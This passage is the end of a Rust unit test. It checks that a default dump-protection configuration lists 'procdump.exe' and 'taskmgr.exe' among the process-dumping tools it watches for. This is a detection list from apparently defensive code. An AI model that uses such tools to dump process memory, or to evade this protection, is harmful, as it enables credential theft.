        let config = DumpProtectionConfig::default();
        let names: Vec<&str> = config.dump_tool_names.iter().map(|s| s.as_str()).collect();
        assert!(names.contains(&"procdump.exe"));
        assert!(names.contains(&"taskmgr.exe"));
    }
}
